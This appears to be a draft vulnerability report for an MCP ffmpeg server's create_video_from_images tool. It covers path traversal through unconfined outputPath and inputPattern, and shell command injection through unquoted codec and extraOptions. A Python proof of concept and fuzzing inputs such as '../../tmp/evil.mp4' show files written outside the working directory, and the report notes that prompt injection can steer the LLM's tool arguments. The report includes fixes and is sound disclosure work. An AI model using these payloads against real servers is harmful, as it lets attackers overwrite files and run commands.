# Path traversal in `create_video_from_images`: `outputPath` and `inputPattern` are not confined, so directories are created and files written anywhere

**Repository:** `sworddut/mcp-ffmpeg-helper` · **Tool:** `create_video_from_images` · **Tested commit:** `d68d010`
**Weakness:** CWE-22 Path Traversal

## Summary
`create_video_from_images` encodes an image sequence (`inputPattern`) into a video at `outputPath`. `inputPattern` is not checked at all, and `outputPath` is checked only for being non-empty. The server creates the output's parent directories and passes `-y`, so a caller can create directories and write or overwrite files anywhere the server user can write, and can read image sequences from anywhere.

## Details
`src/tools/handlers.ts:56-70`:

```ts
case "create_video_from_images": {
  const inputPattern = String(args?.inputPattern);
  const outputPath = validatePath(String(args?.outputPath));
  const framerate = Number(args?.framerate || 25);
  const codec = String(args?.codec || "libx264");
  const pixelFormat = String(args?.pixelFormat || "yuv420p");
  const extraOptions = String(args?.extraOptions || "");
  ...
  await ensureDirectoryExists(outputPath);
  const command = `-framerate ${framerate} -i "${inputPattern}" -c:v ${codec} -pix_fmt ${pixelFormat} ${extraOptions} "${outputPath}" -y`;
  const result = await runFFmpegCommand(command);
```

`validatePath` (`src/utils/file.ts:23-33`) does not resolve the path or compare it with a root. `ensureDirectoryExists` (`src/utils/file.ts:8-18`) runs `mkdir(dirname(outputPath), { recursive: true })` on whatever was passed. Unlike the other tools, this one runs no existence check on its input, so a traversal `outputPath` reaches `mkdir` and ffmpeg directly.

A related, more serious problem sits in the same code path. `runFFmpegCommand` (`src/utils/ffmpeg.ts:33-40`) runs `ffmpeg ${command}` with `shell: true`. `codec`, `pixelFormat` and `extraOptions` are inserted unquoted and the paths only inside double quotes. The fuzzing log confirms that `/bin/sh` parses caller input (see Actual behavior). This is OS command injection (CWE-78) and should be fixed together, with an argument array and `spawn("ffmpeg", argv)` without a shell.

## Steps to reproduce
1. Prerequisites: Node.js (README: v14+) and `ffmpeg` on `PATH`. Create a few test images and a working directory for the server:
   ```bash
   ffmpeg -f lavfi -i testsrc=duration=3:size=64x64:rate=1 /tmp/tofu-img%03d.png
   mkdir -p /tmp/tofu-work/a/b/c
   ```
2. Install and build as the README describes:
   ```bash
   git clone https://github.com/sworddut/mcp-ffmpeg-helper.git
   cd mcp-ffmpeg-helper && npm install && npm run build
   ```
   The server is `node build/index.js`. The script below starts it with `/tmp/tofu-work/a/b/c` as its working directory.
3. Call the tool (`mpeg4` is used so that the test does not depend on libx264):
   ```json
   {"inputPattern": "/tmp/tofu-img%03d.png", "outputPath": "../../../../../../../../tmp/tofu-poc/images.mp4", "framerate": 1, "codec": "mpeg4", "pixelFormat": "yuv420p", "extraOptions": ""}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="node",
           args=["/path/to/mcp-ffmpeg-helper/build/index.js"],
           cwd="/tmp/tofu-work/a/b/c",
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("create_video_from_images", {
                   "inputPattern": "/tmp/tofu-img%03d.png",
                   "outputPath": "../../../../../../../../tmp/tofu-poc/images.mp4",
                   "framerate": 1,
                   "codec": "mpeg4",
                   "pixelFormat": "yuv420p",
                   "extraOptions": "",
               })
               print(result)

   asyncio.run(main())
   ```
4. Observe: `/tmp/tofu-poc/` is created and `/tmp/tofu-poc/images.mp4` is written, outside the server's working directory. A second run overwrites it without a prompt.

## Expected behavior
`inputPattern` and `outputPath` are limited to a configured media or project directory. Paths that resolve outside it are rejected before any directory is created. Existing files are not overwritten unless the caller explicitly asks for it.

## Actual behavior
During fuzzing, the traversal `outputPath` reached `fs.mkdir` unmodified. The write failed only because of the sandbox:

```
{'inputPattern': 'img%03d.jpg', 'outputPath': '../../../../../tmp/evil.mp4', ...}
-> Error: ENOENT: no such file or directory, mkdir '../../../../../tmp'
```

Another call shows that the command line goes through `/bin/sh`, and that the tool reports success even when the shell fails:

```
Video creation completed: "inputPattern": "img%0 → d.jpg", "outputPath": "../..//..../../tm

/bin/sh: 1: Syntax error: Unterminated quoted string
```

## Impact
The LLM chooses these arguments, and prompt injection in content it reads can steer them. An attacker can make the server create directories and write or overwrite files anywhere the user can write. Because `extraOptions` accepts `-f <format>`, even files without a media extension can be overwritten with video bytes. That is an integrity and availability impact. The shell parsing shown above is more severe and should be treated as a separate finding.

## Suggested fix
- Add an allowed root, for example a CLI argument or env var that defaults to the working directory. Resolve `outputPath` (and the directory part of `inputPattern`) and reject it unless it is inside the root.
- Replace the unconditional `-y` with `-n`, or add an explicit `overwrite` argument.
- Call `spawn("ffmpeg", argv)` with an argument array and no shell. Validate `codec` and `pixelFormat` against known names, and split `extraOptions` into tokens.
- Report an error when ffmpeg or the shell exits non-zero, instead of returning "Video creation completed".

## Status on the default branch
Still present at `d68d010` (2026-01-04). The tested commit is the current default branch head.

## Prior reports
- #6 "Security: OS command injection via unsanitized tool arguments in runFFmpegCommand (shell:true)" (issue, open 2026-07-11): reports the `shell: true` command injection that this draft mentions under Details (it names `create_video_from_images` `codec`, `pixelFormat` and `extraOptions`). It notes that `validatePath()` only checks existence but does not report path traversal or missing confinement. No fix: the default branch head `d68d010` (2026-01-04) predates it.
- Documentation: README.md: "C:/Users/username/videos/long_video.mp4" (the usage examples pass absolute paths under the user's home, and troubleshooting says only to make sure the app has permission for the given files and directories; there is no security section and no allowed-directory setting, so unconfined paths look like the intended contract)

<details>
<summary>Internal notes (remove before filing)</summary>

- DUPLICATE/FIXED CHECK: CWE-22 not reported anywhere; the CWE-78 shell problem mentioned in Details is already reported as #6 (open, unfixed), so do not file it again as a new issue.
- ToFu class / sanitizers: path-traversal (CWE-22); `check_path_traversal`.
- Campaigns and executions: corpus-sbx 3072 exec / 3071 ok; e2-0922 1 exec / 1 ok (60 s budgets).
- Evidence (verbatim, trimmed):
  - `{'inputPattern': 'img%03d.jpg', 'outputPath': '../../../../../tmp/evil.mp4', 'framerate': 0, 'codec': 'libx264', 'pixelFormat': 'yuv420p', 'extraOptions': ''}` -> `Error: ENOENT: no such file or directory, mkdir '../../../../../tmp'`
  - `{'inputPattern': 'img%03d.jpg', 'outputPath': '../..//..../../tmp/evil.mp4', ...}` -> `Error: ENOENT: no such file or directory, mkdir '../..//....'`
  - `{'inputPattern': '"inputPattern": "img%0', 'outputPath': 'd.jpg", "outputPath": "../..//..../../tm', 'framerate': 0.0, 'codec': '', 'pixelFormat': '', 'extraOptions': ''}` -> `Video creation completed: ... /bin/sh: 1: Syntax error: Unterminated quoted string`
- Hand-check hints: weak as CWE-22, but the strongest of the 8 ffmpeg-helper drafts. Evidence shows an unmodified traversal path reaching `fs.mkdir`, and there is no input existence check here. Still, the server defines no intended directory, and the README examples use absolute paths, so maintainers may call arbitrary paths by design. The ENOENT on recursive mkdir is a sandbox artifact I could not explain from the log. Evidence #3 is the most useful item: it proves caller input is parsed by `/bin/sh` (CWE-78, `src/utils/ffmpeg.ts:36-40`). That should be its own report. Same root cause as the other 7 drafts for this repo. The reproduction above was derived from the code and has not been run.
</details>
